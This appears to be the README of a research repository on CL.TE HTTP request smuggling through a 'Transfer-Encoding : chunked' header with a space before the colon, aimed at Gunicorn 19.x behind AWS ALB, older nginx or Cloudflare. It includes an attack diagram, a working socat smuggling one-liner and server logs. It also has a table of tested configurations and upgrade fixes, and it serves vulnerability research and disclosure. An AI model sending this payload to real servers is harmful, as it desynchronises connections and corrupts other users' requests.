# HTTP Request Smuggling — CL.TE via Space-in-Header

Research into CL.TE desynchronization attacks exploiting `Transfer-Encoding : chunked` (space before colon). Frontends that ignore the malformed header use `Content-Length`; backends (Gunicorn 19.x) that accept it use `Transfer-Encoding` — creating a request boundary mismatch.

---

## The Vulnerability

```
Transfer-Encoding : chunked     ← space before colon
                  ^
                  This space makes the header "invalid" per strict parsers.
                  But Gunicorn 19.x silently normalizes it to:
                  Transfer-Encoding: chunked
```

**Frontend** (ALB/nginx <1.22/Cloudflare) → uses `Content-Length`, sees ONE request
**Backend** (Gunicorn 19.x) → uses `Transfer-Encoding`, sees TWO requests

---

## Attack Flow

```
  Attacker                    Frontend (ALB)              Backend (Gunicorn 19)
     |                             |                             |
     |  POST / HTTP/1.1            |                             |
     |  Content-Length: 83         |                             |
     |  Transfer-Encoding : chunked|                             |
     |                             |                             |
     |  0\r\n\r\n                  |                             |
     |  XXX / HTTP/1.1             |                             |
     |  Host: target               |                             |
     |                             |                             |
     |----- ONE request (CL=83) -->|                             |
     |                             |--- forwards as-is --------->|
     |                             |                             |
     |                             |      Request 1: POST /      |
     |                             |      (body: empty, TE=0)    |
     |                             |                             |
     |                             |      Request 2: XXX /       |
     |                             |      (smuggled! poisons     |
     |                             |       next user's request)  |
     |                             |                             |
```

---

## Quick Reproduce (ALB + Gunicorn 19.7.1)

```bash
# Smuggle an XXX method — next real user gets "method not found"
cat <(printf "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 83\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nXXX / HTTP/1.1\r\nHost: TARGET\r\n\r\n") - | socat - TCP:TARGET:80
```

Server logs show two requests from one payload:
```
[DEBUG] POST /           ← attacker's request
[DEBUG] XXX /            ← smuggled request (poisons next connection)
[DEBUG] Closing connection.
```

---

## Tested Configurations

| Frontend          | Backend           | Vulnerable? | Notes                                      |
|-------------------|-------------------|-------------|--------------------------------------------|
| **AWS ALB**       | Gunicorn 19.7.1   | **YES**     | ALB normalizes header, forwards to backend |
| **Cloudflare**    | Next.js backend   | **Partial** | Desync confirmed, cross-user impact limited|
| **nginx <1.22**   | Gunicorn 19.x     | **YES**     | Accepts space-in-header                    |
| **nginx 1.22.0+** | any               | No          | Rejects all space-in-header (400)          |
| **Apache 2.4.20** | any               | No          | Rejects TE with space (400)                |
| any               | **Gunicorn 20.0.2+** | No       | Rejects space-in-header (400)              |

---

## Directory Structure

```
backends/                    Backend server setups (the target being exploited)
  gunicorn-19/               Gunicorn 19.7.1 + Flask (VULNERABLE)
  gunicorn-20-flask1/        Gunicorn 20.0.0 + Flask 1.1.1 (deployed to EC2)
  gunicorn-20-flask3/        Gunicorn 20.0.0 + Flask 3.0.0 (local testing)

proxies/                     Frontend proxy/LB configurations
  nginx/                     Nginx configs + Dockerfile (with Lua logging)
    body-capture/            Nginx setup for capturing request bodies
  haproxy/                   HAProxy + Gunicorn docker-compose stack

exploits/                    Attack tools
  scripts/                   Python exploit scripts
    alb-smuggle.py           Socket-based ALB CL.TE exploit
    get-flood.py             GET request flood (observe smuggled effects)
    haproxy-vtab.py          HAProxy exploit using \x0b (vertical tab)
    haproxy-intruder.py      Burp Turbo Intruder script for HAProxy
    split-request.py         Split-send timing attack test
  payloads/                  Documented payloads (socat/curl commands)
    alb-cl-te.md             All ALB payload variations tested
    cloudflare.md            Cloudflare desync payloads
    haproxy-burp.md          Burp Intruder script for HAProxy
    te0-capture.md           TE.0 victim request capture technique

tools/                       Shared utilities
  lib/EasySSL.py             SSL/TCP socket wrapper
  lib/Payload.py             Payload template builder
  wrapper.py                 Socat command generator
  docker_test.py             Local docker testing script

docs/                        Research findings per target
  alb-findings.md            AWS ALB desync (confirmed, with PoC)
  nginx-findings.md          Nginx version comparison (1.14, 1.21, 1.22)
  apache-findings.md         Apache — not vulnerable
  haproxy-findings.md        HAProxy + vertical tab variant
  cloudflare-findings.md     Cloudflare — partial desync
  server-logs.md             Raw Gunicorn log evidence
  version-diff.md            Gunicorn 19 vs 20 behavior

captures/                    Packet captures
  *.pcap, *.pcapng           Wireshark/tshark dumps from EC2 docker0

archive/                     Old scratch files and experiments
```

---

## Key Findings

1. **AWS ALB + Gunicorn 19.7.1** = fully exploitable CL.TE desync ([details](docs/alb-findings.md))
2. **Gunicorn 19.x** accepts `Header : value` (space before colon) — the root cause ([details](docs/version-diff.md))
3. **Gunicorn 20.0.2+** rejects it → not exploitable
4. **nginx 1.22.0+** rejects space-in-header → blocks attack at frontend ([details](docs/nginx-findings.md))
5. **Apache** rejects it too → safe frontend ([details](docs/apache-findings.md))
6. **Cloudflare** forwards the header → desync possible but limited ([details](docs/cloudflare-findings.md))

---

## Tools Used

- **socat** — raw TCP/SSL connections for precise HTTP crafting
- **curl** — baseline request testing
- **Python socket** — programmatic exploit scripts
- **Burp Suite Turbo Intruder** — automated timing attacks
- **Wireshark/tshark** — packet capture on EC2
- **Docker** — isolated test environments

---

## Fix

Upgrade Gunicorn to **20.0.2+** or put **nginx 1.22.0+** / **Apache** in front.
